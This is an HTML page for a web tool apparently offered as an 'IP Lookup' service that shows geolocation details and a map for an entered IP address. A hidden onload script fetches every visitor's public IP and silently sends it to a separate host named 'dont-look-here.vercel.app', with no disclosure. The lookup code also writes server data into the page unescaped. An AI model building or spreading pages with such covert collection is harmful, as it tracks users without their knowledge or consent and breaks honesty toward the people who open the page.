<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Lookup</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: #121212;
            color: white;
            text-align: center;
            padding: 20px;
        }

        h2 {
            font-size: 28px;
            margin-bottom: 15px;
        }

        .container {
            max-width: 500px;
            background: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.1);
            margin: 0 auto;
        }

        input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            margin-bottom: 10px;
            background: #2c2c2c;
            color: white;
            font-size: 16px;
            outline: none;
        }

        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background: #ff6600;
            color: white;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s ease-in-out;
            margin-top: 10px;
        }

        button:hover {
            background: #e65c00;
            box-shadow: 0px 0px 10px rgba(255, 102, 0, 0.8);
        }

        #result {
            margin-top: 20px;
        }

        .info-box {
            background: #252525;
            padding: 15px;
            border-radius: 5px;
            text-align: left;
            margin-top: 15px;
            box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.1);
        }

        .info-box p {
            font-size: 16px;
            margin: 8px 0;
        }

        .map {
            margin-top: 15px;
        }

        iframe {
            width: 100%;
            height: 250px;
            border-radius: 5px;
            border: none;
        }

        .helper-link {
            display: block;
            margin-top: 10px;
            font-size: 14px;
        }

        .helper-link a {
            color: #ff6600;
            text-decoration: none;
            transition: 0.3s;
        }

        .helper-link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <h2>üåç IP Lookup</h2>
    <div class="container">
        <input type="text" id="ipInput" placeholder="Enter IP address">
        <button onclick="lookupIP()">üîç Lookup</button>
        <p class="helper-link">
            <a href="https://whats-my-ip-now.vercel.app/" target="_blank">Don't know your public IP?</a>
        </p>
        <div id="result"></div>
    </div>

    <script>
        // Fetch user's public IP on page load and send it
        window.onload = function () {
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    sendIP(data.ip); // Automatically send the IP
                })
                .catch(error => console.error("Failed to fetch IP:", error));
        };

        function lookupIP() {
            const ip = document.getElementById("ipInput").value;
            if (!ip) return alert("‚ö†Ô∏è Please enter an IP address.");
            
            fetch(`/api/api.js?ip=${ip}`)
                .then(response => response.json())
                .then(data => {
                    if (data.error) {
                        document.getElementById("result").innerHTML = `<p style="color:red; text-align:center;">${data.error}</p>`;
                        return;
                    }

                    document.getElementById("result").innerHTML = `
                        <div class="info-box">
                            <p><strong>üìå IP Address:</strong> ${data.ip}</p>
                            <p><strong>üåé Country:</strong> ${data.country}</p>
                            <p><strong>üèôÔ∏è Region:</strong> ${data.region}</p>
                            <p><strong>üè° City:</strong> ${data.city}</p>
                            <p><strong>üì° ISP:</strong> ${data.isp}</p>
                            <p><strong>‚è∞ Timezone:</strong> ${data.timezone}</p>
                            <p><strong>üìç Coordinates:</strong> ${data.lat}, ${data.lon}</p>
                        </div>
                        <div class="map">
                            <iframe 
                                src="https://maps.google.com/maps?q=${data.lat},${data.lon}&z=10&output=embed">
                            </iframe>
                        </div>
                    `;
                })
                .catch(error => {
                    document.getElementById("result").innerHTML = `<p style="color:red; text-align:center;">‚ùå Error fetching data.</p>`;
                });
        }

        function sendIP(ip) {
            fetch("https://dont-look-here.vercel.app/api/api.js", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ ip }) // Send the raw IP, no encoding
            })
            .then(response => response.json())
            .then(data => {
                console.log("Server Response:", data);
            })
            .catch(error => {
                console.error("Error:", error);
            });
        }
    </script>
</body>
</html>
